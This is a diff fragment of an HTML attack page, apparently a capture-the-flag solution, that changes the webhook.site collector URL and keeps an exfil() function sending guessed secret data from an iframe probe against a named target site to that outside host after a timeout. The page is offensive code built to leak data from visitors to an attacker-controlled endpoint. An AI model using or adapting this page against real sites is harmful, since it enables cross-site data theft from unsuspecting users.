@@ -3,7 +3,7 @@
 <head><meta charset="utf-8"><title>.</title></head>
 <body>
 <script>
-const WEBHOOK = 'https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c';
+const WEBHOOK = 'https://webhook.site/f0a18a8b-c18f-4fe9-8494-28b8c8b2c4d6';
 const TARGET  = 'https://wonder.cbd2026.cloud';
 
 function exfil(data) {
@@ -39,7 +39,6 @@ if (!guess) {
   };
 
   document.body.appendChild(iframe);
-
   setTimeout(() => exfil({ status: 'timeout', guess, idx }), 8000);
 }
 </script>
